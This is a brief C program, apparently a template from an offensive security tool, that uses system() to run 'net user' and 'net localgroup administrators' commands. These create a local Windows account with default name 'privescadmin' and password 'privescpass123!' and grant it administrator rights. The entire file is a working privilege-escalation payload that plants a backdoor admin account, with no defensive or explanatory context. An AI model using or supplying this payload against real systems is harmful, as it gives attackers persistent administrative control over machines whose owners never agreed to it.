#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user <%=${username:-privescadmin}%> <%=${password:-privescpass123!}%> /add");
  i = system ("net localgroup administrators <%=${username:-privescadmin}%> /add");
  
  return 0;
}
